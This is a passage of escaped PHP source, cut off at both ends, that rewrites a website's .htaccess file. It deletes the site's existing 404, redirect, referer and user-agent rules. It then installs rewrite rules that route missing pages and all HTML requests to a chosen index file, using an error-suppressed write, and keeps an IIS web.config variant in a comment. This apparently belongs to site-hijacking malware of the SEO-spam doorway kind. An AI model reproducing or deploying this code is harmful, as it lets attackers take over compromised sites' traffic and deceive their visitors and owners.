                        $remove = true;\n                    }\n\n                    if(strpos($line, 'ErrorDocument 404') !== false){\n                        $remove = true;\n                    }\n\n                    if(strpos($line, 'R=301') !== false){\n                        $remove = true;\n                    }\n\n                    if(strpos($line, 'R=302') !== false){\n                        $remove = true;\n                    }\n\n                    if(strpos($line, 'HTTP_REFERER') !== false){\n                        $remove = true;\n                    }\n\n                    if(strpos($line, 'HTTP_USER_AGENT') !== false){\n                        $remove = true;\n                    }\n\n                    if($remove){\n                        unset($lines[$i]);\n                    }\n\n                }\n\n                $content = implode(\"\\n\", $lines);\n\n            } else {\n                $content = '';\n            }\n\n        } else {\n\n            $filePath = $this->getRootDir() . DIRECTORY_SEPARATOR . '.htaccess';\n\n        }\n\n\/\/@TODO remove prev change\n\/\/@TODO remove existing DirectoryIndex\n        $content = \"\n\n$content\n\n<IfModule mod_rewrite.c>\n    SetEnv HTTP_MOD_REWRITE On\n<\/IfModule>\n\nRewriteEngine on\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^.*$ $indexFileName [NC,L]\n\nRewriteCond %{REQUEST_FILENAME} -s [OR]\nRewriteCond %{REQUEST_FILENAME} -l [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteCond %{REQUEST_URI} .*\\.html [OR]\nRewriteCond %{REQUEST_URI} .*\\.htm\nRewriteCond %{REQUEST_URI} !.*\\.php\nRewriteRule ^.*$ $indexFileName [NC,L]\n\nDirectoryIndex $indexFileName\n        \";\n\n        @__via_file_put_contents($filePath, $content);\n\n        \/*\n                $webConfig = '\n\n        <rule name=\"rule 1H\" stopProcessing=\"true\">\n            <match url=\"^.*$\"  ignoreCase=\"true\" \/>\n            <action type=\"Rewrite\" url=\"\/-\"  \/>\n        <\/rule>\n        <rule